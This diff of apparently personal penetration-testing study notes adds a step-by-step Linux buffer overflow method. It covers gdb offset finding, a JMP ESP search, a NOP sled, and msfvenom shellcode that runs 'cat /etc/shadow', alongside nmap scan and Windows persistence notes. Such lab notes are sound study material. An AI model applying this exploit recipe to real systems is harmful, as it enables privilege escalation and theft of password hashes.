@@ -1084,6 +1084,33 @@ DRYRUN
 --script http-sql-injection.nse
 
 
+                           /\
+                          /  \
+                         /    \
+                        /      \
+                       /        \
+                      /          \
+                    _________________
+                  /                   \
+                 /                     \ 
+                /                       \
+               /                         \
+______________/                           \_____________
+
+
+
+
+________________                        _____________
+                \          /\          /
+                 \        /  \        /
+                  \      /    \      /
+                   \    /      \    /
+                    \  /        \  /
+                     \/          \/
+
+
+
+
 DRYRUN WALKTHROUGH
 -----------------------
 scan the IP address with (nmap -Pn -T4 --min-rate 654874654 <IP> -p20,21,22,2222,4444,4242,80,8080,3389) 
@@ -1246,23 +1273,131 @@ click on the file that was uploaded to the website
 limited shell
 ssh keygen steps
 
+Linux buffer overflow
+--------------------------
+if you find a command/program that is obviously not a normal program
+run the program and see how it works
+scp (specify port with a -P)
+gdb <program>
+pdisass main
+ignore get_pc_thunk
+pdisass <other functions>
+research vulnerable function
+pdisass <vulnerable function>
+
+get the pattern from the buffer overflow pattern generator
+input the pattern into the exploit file that will be used
+
+Example Code
+--
+overflow = <pattern>
+
+print(overflow)
+--
+
+run program in gdb again after saving file
+if user input <<<
+if not user input then do not use <<< (try both)
+run <<< $(python <filename>)
+find the EIP out of the output
+paste the EIP in the register offset of the same website that gave the pattern
+
+Example code
+--
+overflow = "A" * <offset>
+eip = "B" * 4
+
+print(overflow+eip)
+--
+run the gdb program again (run <<< $(python <filename>)), if the eip is not 4Bs then the offset is wrong and try again
+close gdb
+reopen in environmentless mode (env - gdb <program>)
+show env
+unset env <env lines>
+clear all lines
+run
+overflow manually by spamming the keyboard with a bunch of characters and getting a SIGSEGV error in return
+run info proc map
+find /b <start address under the heap>,<end address above the stack>,0xff,0xe4
+grab 5 out of the screen that returns
+
+Example code
+--
+overflow = "A" * 62
+eip = <reverse endian of one of the 5> ('\x<2characters>\x<2characters>\x<2characters>\x<2characters>')
+'''
+<paste the 5 here>
+'''
+
+nop = '\x90' * 10
+
+print(overflow + eip + nop)
+--
+close gdb
+msfvenom -p linux/x86/exec CMD="cat /etc/shadow" -b '\x00' -f python
+input the output of the above command into the file
+
+Example code
+--
+overflow = "A" * 62
+eip = <reverse endian of one of the 5> ('\x<2characters>\x<2characters>\x<2characters>\x<2characters>')
+'''
+<paste the 5 here>
+'''
+
+nop = '\x90' * 10
+
+<the output named above> 
+
+print(overflow + eip + nop + buf)
+--
+run the program with (./<program> <<<$(python <filename>))
+sudo the program, do not ever sudo the msfvenom command
 
 
-                  ___________________
-                 /                    \
-                /                      \ 
-               /                        \
-              /                          \
-_____________/                            \____________________
+IF THE OVERFLOW DOES NOT WORK
+-----------------------------
+run info proc map on the machine that you are trying to exploit
+increase nop sled, no bigger than 25
+change eip and repeat steps
+if it still does not work, restart the entire process again
+
+Further review
+-----------------------------
+to obtain linux kernel - (uname -a)
+check rsyslog (/etc/rsyslog.conf)
+
+Windows persistence (runkeys)
+user directories in windows (C:\Users) (to view hidden files select the view hidden files button in the file tab)
+
+security policies (auditpol /get /category:*)(must be privileged user/must be privileged runas for cmd)
+
+C code (>> <<)(bit shift)
+
+
+                           /\
+                          /  \
+                         /    \
+                        /      \
+                       /        \
+                      /          \
+                    _________________
+                  /                   \
+                 /                     \ 
+                /                       \
+               /                         \
+______________/                           \_____________
 
 
 
 
-
-
-
-
-
+________________                        _____________
+                \          /\          /
+                 \        /  \        /
+                  \      /    \      /
+                   \    /      \    /
+                    \  /        \  /
+                     \/          \/
 
 
 
